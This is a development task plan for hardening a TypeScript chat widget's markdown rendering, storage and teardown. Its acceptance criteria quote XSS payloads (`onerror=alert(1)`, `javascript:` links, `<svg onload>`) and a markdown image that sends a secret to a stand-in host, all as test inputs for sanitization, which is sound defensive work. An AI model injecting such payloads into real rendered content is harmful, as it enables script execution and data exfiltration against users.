# Todo: Security hardening & correctness fixes

See `tasks/plan.md` for context, decisions, risks and open questions.
Standard verification for every task: `npm test`, `npm run build`, `npm run lint`.

---

## Phase 1: XSS fix

### Task 1: Jest + jsdom test setup
**Description:** Configure the existing devDependencies (jest 28, ts-jest, jest-environment-jsdom) so `npm test` runs TypeScript tests against the DOM. Prove that ESM deps (`marked`) load.

**Acceptance criteria:**
- [ ] `jest.config.cjs` with ts-jest preset, jsdom environment, CSS import mocked (`moduleNameMapper` for `\.css$`)
- [ ] A smoke test renders markdown via `marked` and passes
- [ ] `vega-embed` mocked by default in tests

**Verification:** `npm test` green; `npm run build` unaffected.
**Dependencies:** None
**Files:** `jest.config.cjs`, `src/__tests__/smoke.test.ts`, `src/__mocks__/` (if needed), `package.json`
**Scope:** S

### Task 2: Extract markdown pipeline to `src/core/markdown.ts`
**Description:** Move `setupMarkedRenderer` and the `marked()` calls out of `ChatWidget.ts` into a module that builds a per-instance `new Marked(...)`. Contract collection goes through a callback, not `this.pendingContracts`. No behavior change.

**Acceptance criteria:**
- [ ] `ChatWidgetCore` has no `marked.use`/`marked.setOptions`; each instance owns its renderer
- [ ] Two widget instances on one page don't share renderer state (test)
- [ ] Characterization tests for `chart`, `image`, inline `image{}`, `flag`, `report`, table, link output

**Verification:** tests green; manual: `npm run start:react`, send a message containing each block type (or use history).
**Dependencies:** T1
**Files:** `src/core/markdown.ts`, `src/core/ChatWidget.ts`, `src/core/__tests__/markdown.test.ts`
**Scope:** M

### Task 3: Escape model data in custom renderers
**Description:** Add `escapeHtml`/`escapeAttr` to `utils.ts`. Apply them to link `href`/`title`, report `name`/`role`/`contractId`, flag `country`, and image `data-contract` plus the `onLink` URL. Validate the flag `code` against `/^[a-z]{2}$/i`. Link renderer: allow only `http:`, `https:`, `mailto:`, relative; add `rel="noopener noreferrer"`.

**Acceptance criteria:**
- [ ] Payloads like `"><img src=x onerror=alert(1)>` in every field render as text (tests per renderer)
- [ ] `[x](javascript:alert(1))` renders without a `javascript:` href
- [ ] Invalid flag code renders nothing/`N/A`, never a URL

**Verification:** tests green.
**Dependencies:** T2
**Files:** `src/core/utils.ts`, `src/core/markdown.ts`, tests
**Scope:** S

### Task 4: Sanitize rendered HTML with DOMPurify
**Description:** Add `dompurify` and run the output of the `markdown.ts` render function through it, with an allowlist for widget-owned attributes and an `afterSanitizeAttributes` hook for link policy. Both innerHTML sinks (`updateMessage`, `renderMessage`) use only the sanitized output.

**Acceptance criteria:**
- [ ] Raw HTML payloads (`<img onerror>`, `<svg onload>`, `<iframe>`, `<script>`, `<a href=javascript:>`) are neutralized — streaming path, final render, and history reload
- [ ] Charts, contract images, report cards, flags, tables still render (snapshot tests)
- [ ] Browser IIFE bundle builds and includes DOMPurify

**Verification:** tests green; build; manual check in both examples, including loading an old chat from history.
**Dependencies:** T2, T3
**Files:** `package.json`, `src/core/markdown.ts`, `src/core/ChatWidget.ts`, tests
**Scope:** M

### Checkpoint A
- [ ] `npm test`, `npm run build`, `npm run lint` clean
- [ ] Manual: react + vanilla examples behave as before
- [ ] Human review → merge Phase 1 PR

---

## Phase 2: Exfiltration & code-execution surface

### Task 5: `allowedResourceOrigins` option for remote images
**Description:** New option (default: same-origin). The DOMPurify hook removes `<img src>` from other origins unless they're allowed; `'*'` allows all. Contract images set by `onImageBlock` are host-provided and exempt. Add it to `types.ts` and the README options table.

**Acceptance criteria:**
- [ ] `![](https://evil.test/?q=secret)` produces no request when the origin isn't allowed (test checks the `src` is removed)
- [ ] Allowed origins and `'*'` work
- [ ] README options table updated

**Verification:** tests; manual in an example with an allowed origin.
**Dependencies:** T4
**Files:** `src/core/types.ts`, `src/core/markdown.ts`, `README.md`, tests
**Scope:** S

### Task 6: Vega interpreter mode + restricted loader
**Description:** Add `vega-interpreter` as a dependency; call `vegaEmbed(el, spec, { actions:false, ast:true, expr: expressionInterpreter, loader })`. The loader rejects URLs from origins outside `allowedResourceOrigins`.

**Acceptance criteria:**
- [ ] Example charts render with a CSP of `script-src 'self'` (no `unsafe-eval`)
- [ ] A spec with `data.url` to a non-allowed origin fails gracefully ("Error rendering chart data.")
- [ ] Parcel alias still resolves (examples run)

**Verification:** build; manual with a CSP meta tag added temporarily to `examples/react/index.html`.
**Dependencies:** T2, T5
**Files:** `package.json`, `src/core/ChatWidget.ts` (or `markdown.ts`/`charts.ts`), tests
**Scope:** S

### Checkpoint B
- [ ] Tests/build/lint clean; README documents the behavior change
- [ ] Human review → merge Phase 2 PR

---

## Phase 3: Storage & correctness

### Task 7: Storage hardening
**Description:** Persist the generated anonymous `userId` (a localStorage key) so history survives reloads. `cleanupOldData` considers all users' chats, oldest first. Wrap `setItem` in try/catch: on `QuotaExceededError`, clean up and retry once, then degrade quietly (no throw into `sendMessage`). Add a public `clearHistory()` to the core and both wrappers.

**Acceptance criteria:**
- [ ] Reloading without a `userId` param shows previous chats
- [ ] A filled localStorage (mocked quota throw) never breaks sending a message
- [ ] `clearHistory()` removes all of the widget's data; documented in README

**Verification:** unit tests for `Storage`; manual reload test.
**Dependencies:** T1
**Files:** `src/core/Storage.ts`, `src/core/ChatWidget.ts`, `src/vanilla/ChatWidget.ts`, `README.md`, tests
**Scope:** M

### Task 8: Contract-image fixes
**Description:** Match resolved URLs to DOM by `data-contract` (as `applyStoredImages` does) instead of by index. Collect contracts per message, so re-rendering history doesn't leak IDs into the next request. Call the finalize path for non-streaming responses too.

**Acceptance criteria:**
- [ ] Repeated contract IDs and report cards get the correct images (test)
- [ ] Loading a history chat and then sending a message calls `onImageBlock` with only the new message's IDs
- [ ] Non-streaming responses resolve images and persist `processedImages`

**Verification:** tests; manual with an `onImageBlock` stub in the example.
**Dependencies:** T2
**Files:** `src/core/ChatWidget.ts`, `src/core/markdown.ts`, tests
**Scope:** S

### Task 9: Small correctness bugs
**Description:** Message IDs → `crypto.randomUUID()`. Feedback on the message at index 0 must not use `.at(-1)`. Replace `keypress` with `keydown`; ignore Enter when `shiftKey` or `isComposing` is set.

**Acceptance criteria:**
- [ ] User and bot messages never share an ID (test with mocked `Date.now`)
- [ ] Feedback on the first message passes `[undefined/previous user msg, assistant]` correctly
- [ ] Shift+Enter inserts a newline; IME composition Enter doesn't send

**Verification:** tests; manual typing check.
**Dependencies:** T1
**Files:** `src/core/ChatWidget.ts`, tests
**Scope:** S

### Task 10: Proper teardown in `destroy()`
**Description:** Abort any in-flight request, remove the click listener added to a host `toggleButton` (store the handler reference), and revoke object URLs created for attachments.

**Acceptance criteria:**
- [ ] React StrictMode double-mount: one click on the external toggle triggers exactly one toggle
- [ ] After `destroy()`, a pending stream doesn't call callbacks or touch the DOM

**Verification:** tests; manual in `examples/react` wrapped in `<StrictMode>`.
**Dependencies:** T1
**Files:** `src/core/ChatWidget.ts`, tests
**Scope:** S

### Checkpoint C
- [ ] Tests/build/lint clean
- [ ] Manual: streaming, non-streaming, history reload, StrictMode remount
- [ ] Human review → merge Phase 3 PR

---

## Phase 4: Performance & hygiene

### Task 11: Streaming performance + request size
**Description:** While streaming, show charts as placeholders and embed them only in `finalizeLastMessage`. Call `view.finalize()` on replaced or destroyed charts. Send `chat_history` once (inside `input` only — confirm with the backend), excluding the current message, empty and error messages.

**Acceptance criteria:**
- [ ] `vegaEmbed` is called once per chart per message (test with mock)
- [ ] The request body has no duplicate history and no current-message duplicate
- [ ] No visible regression in chart display after streaming completes

**Verification:** tests; manual streaming of a chart answer.
**Dependencies:** T6, T8
**Files:** `src/core/ChatWidget.ts`, tests
**Scope:** S–M

### Task 12: Docs, config and CI hygiene
**Description:** README: security notes (endpoint authorization risk, recommend a proxy; HTML options aren't sanitized). Prompt `text` via `textContent`. `pages.yml`: `npm ci`, actions `@v4`. ESLint: `settings.react.version: 'detect'`. Update CLAUDE.md test instructions.

**Acceptance criteria:**
- [ ] README has a "Security" section
- [ ] Lint runs with no React-version warning
- [ ] CLAUDE.md no longer says "no test suite"

**Verification:** lint; build; read-through.
**Dependencies:** all previous
**Files:** `README.md`, `CLAUDE.md`, `src/core/components/UIComponents.ts`, `.github/workflows/pages.yml`, `eslint.config.mjs`
**Scope:** S

### Checkpoint D
- [ ] All acceptance criteria met; final review
